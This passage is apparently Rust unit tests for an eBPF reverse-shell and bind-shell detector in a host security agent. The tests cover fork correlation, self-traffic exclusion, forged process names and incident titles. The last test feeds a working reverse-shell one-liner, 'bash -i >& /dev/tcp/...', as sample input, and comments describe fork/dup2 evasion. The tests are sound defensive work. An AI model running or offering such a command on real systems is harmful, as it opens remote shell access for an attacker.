    fn ebpf_reverse_shell_still_fires_on_unknown_comm_to_port_22() {
        // Defensive: an unknown binary doing connect+fd_redirect on
        // port 22 is suspicious enough to warrant the alert. Only
        // known operator-tool comms get the exclusion.
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        det.process(&connect_event_with_comm(
            7002,
            "10.0.0.5",
            22,
            "evil-tool",
            now,
        ));
        let inc = det
            .process(&fd_redirect_event(7002, 5, 0, now + Duration::seconds(1)))
            .expect("unknown comm to port 22 must still fire");
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn ebpf_reverse_shell_evidence_carries_source_comm() {
        // Anchor for downstream consumers (incident_autodismiss):
        // evidence must include `source_comm` (captured at connect
        // time, reliable) alongside the legacy `comm` field. Prod
        // observed `comm` returned as garbage bytes from
        // fd_redirect's task lookup; source_comm gives consumers a
        // dependable signal.
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        det.process(&connect_event_with_comm(
            7003, "10.0.0.7", 4444, "evil", now,
        ));
        let inc = det
            .process(&fd_redirect_event(7003, 5, 0, now + Duration::seconds(1)))
            .unwrap();
        let ev = inc.evidence.as_array().unwrap().first().unwrap();
        assert_eq!(ev.get("source_comm").and_then(|v| v.as_str()), Some("evil"));
    }

    #[test]
    fn ebpf_reverse_shell_title_uses_reliable_source_comm_over_corrupted_fd_redirect_comm() {
        // 2026-05-01 audit finding 1.7: prod logs showed
        // `process ◆◆ (pid=...)` because the user-visible title and
        // summary interpolated the fd_redirect-time `comm`, which
        // was returning Unicode replacement characters on some
        // kernels. Anchor: the operator-visible strings must use
        // the connect-time `source_comm` value when available, so
        // an operator triaging a reverse-shell incident sees the
        // actual binary name and not garbage.
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        // Connect event captures the reliable comm "evil-binary".
        det.process(&connect_event_with_comm(
            7100,
            "10.0.0.99",
            4444,
            "evil-binary",
            now,
        ));
        // fd_redirect_event helper hardcodes comm: "bash" — simulates
        // the divergence between the two events' comm values.
        let inc = det
            .process(&fd_redirect_event(7100, 5, 0, now + Duration::seconds(1)))
            .unwrap();
        assert!(
            inc.title.contains("evil-binary"),
            "title must use connect-time comm, got: {}",
            inc.title
        );
        assert!(
            inc.summary.contains("evil-binary"),
            "summary must use connect-time comm, got: {}",
            inc.summary
        );
        assert!(
            !inc.title.contains("bash"),
            "title must NOT use fd_redirect comm (potentially corrupt), got: {}",
            inc.title
        );
    }

    #[test]
    fn ebpf_reverse_shell_title_falls_back_to_comm_when_source_comm_is_empty() {
        // Older sensor builds may emit network.outbound_connect
        // events without a `comm` field (or with empty value). The
        // fallback path uses `comm` from the fd_redirect event so
        // the operator-visible string is never blank — better to
        // show a possibly-corrupt name than no name at all.
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        // Connect event with empty comm — exercises the fallback.
        det.process(&connect_event_with_comm(7101, "10.0.0.99", 4444, "", now));
        let inc = det
            .process(&fd_redirect_event(7101, 5, 0, now + Duration::seconds(1)))
            .unwrap();
        // fd_redirect_event helper hardcodes comm: "bash" → fallback.
        assert!(
            inc.title.contains("bash"),
            "title must fall back to fd_redirect comm when source_comm empty, got: {}",
            inc.title
        );
    }

    #[test]
    fn detects_ebpf_reverse_shell_sequence() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        // Step 1: connect to attacker
        assert!(det
            .process(&connect_event(1234, "10.0.0.1", 4444, now))
            .is_none());

        // Step 2: redirect stdin to socket → reverse shell!
        let inc = det
            .process(&fd_redirect_event(1234, 5, 0, now + Duration::seconds(1)))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("ebpf_reverse_shell"));
        assert!(inc.summary.contains("kernel level"));
    }

    #[test]
    fn detects_ebpf_bind_shell_sequence() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        // Step 1: bind to port
        assert!(det.process(&bind_event(5678, 4444, now)).is_none());

        // Step 2: listen
        assert!(det
            .process(&listen_event(5678, now + Duration::seconds(1)))
            .is_none());

        // Step 3: redirect stdout to socket → bind shell!
        let inc = det
            .process(&fd_redirect_event(5678, 5, 1, now + Duration::seconds(2)))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("ebpf_bind_shell"));
    }

    #[test]
    fn ebpf_sequence_needs_matching_pid() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        // Connect from PID 1234
        det.process(&connect_event(1234, "10.0.0.1", 4444, now));

        // fd_redirect from an UNRELATED PID 5678 (no ppid link) → must NOT trigger
        let inc = det.process(&fd_redirect_event(5678, 5, 0, now + Duration::seconds(1)));
        assert!(inc.is_none());
    }

    /// Regression anchor (evasion audit E4, 2026-06-20): a fork()'d reverse shell
    /// connects in the PARENT then dup2()s the socket onto stdio in the CHILD
    /// (socat / `python: fork; child dup2+exec`). The connect is recorded under
    /// the parent pid, the fd_redirect arrives under the child pid — the old
    /// strict per-pid match never fired. With ppid-aware correlation (parent ring
    /// unioned in) the child's stdio redirect now correctly fires Critical.
    #[test]
    fn ebpf_reverse_shell_fires_across_fork_parent_connect_child_redirect() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        // Parent PID 1234 connects to the attacker.
        assert!(det
            .process(&connect_event(1234, "10.0.0.1", 4444, now))
            .is_none());

        // Child PID 9999 (ppid=1234) dup2's the socket onto stdin → reverse shell.
        let inc = det
            .process(&fd_redirect_event_ppid(
                9999,
                5,
                0,
                1234,
                now + Duration::seconds(1),
            ))
            .expect("a fork()'d reverse shell (connect in parent, dup2 in child) MUST fire");
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("ebpf_reverse_shell"));
    }

    /// Guard the fix's bound: a child fd_redirect whose parent did NOT connect
    /// must still NOT fire (no false positive from the parent-ring union alone).
    #[test]
    fn ebpf_fork_correlation_does_not_false_fire_without_a_parent_connect() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        // Parent 1234 did something unrelated (no connect); child 9999 redirects.
        let inc = det.process(&fd_redirect_event_ppid(9999, 5, 0, 1234, now));
        assert!(inc.is_none());
    }

    /// A pid above the kernel pid_max ceiling → `/proc/<pid>/exe` never exists →
    /// `is_verified_infra_process` takes its comm-match + process-exited fallback,
    /// the same Managed semantics as a live verified InnerWarden process. Avoids
    /// the flaky-small-live-pid /proc read (RECURRING_BUGS.md).
    const DEAD_PID: u32 = 4_000_000_001;

    /// Regression anchor (self-FP found 2026-06-21): InnerWarden's own agent/ctl
    /// connect out (Telegram, API, threat feeds) + dup2 fds, and that shape
    /// self-false-fired `ebpf_reverse_shell` — 126 Critical self-flags / 30 min on
    /// test001 (`innerwarden-age` → Telegram 149.154.166.x). The agent must not
    /// accuse itself of a reverse shell.
    #[test]
    fn innerwarden_self_egress_is_not_flagged_as_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        // Agent connects out, then a fd_redirect at the same pid.
        assert!(det
            .process(&connect_event_with_comm(
                DEAD_PID,
                "149.154.166.110",
                443,
                "innerwarden-agent",
                now
            ))
            .is_none());
        let inc = det.process(&fd_redirect_event(
            DEAD_PID,
            5,
            0,
            now + Duration::seconds(1),
        ));
        assert!(
            inc.is_none(),
            "InnerWarden's own verified egress must NOT fire ebpf_reverse_shell"
        );
    }

    /// The cloud guest-agent gate is DOWNGRADE-ONLY: a real reverse shell (any
    /// non-guest-agent process) still fires. Uses DEAD_PID so `/proc` has no
    /// lineage and `is_guest_agent` is reliably inert on cloud CI runners
    /// (GitHub runners are Azure), so this exercises the real-attacker path. The
    /// guest-agent suppression itself is unit-tested in `crate::cloud_platform`.
    #[test]
    fn guest_agent_gate_does_not_suppress_a_real_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det
            .process(&connect_event(DEAD_PID, "185.220.101.44", 4444, now))
            .is_none());
        let inc = det.process(&fd_redirect_event(
            DEAD_PID,
            5,
            0,
            now + Duration::seconds(1),
        ));
        assert!(
            inc.is_some(),
            "a real (non-guest-agent) reverse shell must still fire"
        );
    }

    /// No blind spot: a process that merely SETS comm=innerwarden-* but whose
    /// `/proc/exe` is NOT a system path (here the test binary under target/) is
    /// still flagged — the exclusion is verified by exe, not the forgeable comm.
    /// Linux-only: needs a real readable /proc/<pid>/exe (absent on macOS).
    #[cfg(target_os = "linux")]
    #[test]
    fn forged_innerwarden_comm_from_nonsystem_exe_still_fires() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let own = std::process::id();
        assert!(det
            .process(&connect_event_with_comm(
                own,
                "10.0.0.1",
                4444,
                "innerwarden-agent",
                now
            ))
            .is_none());
        let inc = det.process(&fd_redirect_event(own, 5, 0, now + Duration::seconds(1)));
        assert!(
            inc.is_some(),
            "a forged comm=innerwarden-* with a non-system /proc/exe must still fire"
        );
    }

    #[test]
    fn ebpf_sequence_ignores_non_stdio_redirect() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        det.process(&connect_event(1234, "10.0.0.1", 4444, now));

        // fd_redirect to fd 5 (not stdin/stdout/stderr) → should NOT trigger
        let inc = det.process(&fd_redirect_event(1234, 3, 5, now + Duration::seconds(1)));
        assert!(inc.is_none());
    }

    #[test]
    fn ebpf_sequence_expires_after_30s() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        det.process(&connect_event(1234, "10.0.0.1", 4444, now));

        // fd_redirect 31 seconds later → too late, sequence expired
        let inc = det.process(&fd_redirect_event(1234, 5, 0, now + Duration::seconds(31)));
        assert!(inc.is_none());
    }

    #[test]
    fn works_with_process_exec_kind() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&process_exec_event(
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }
}
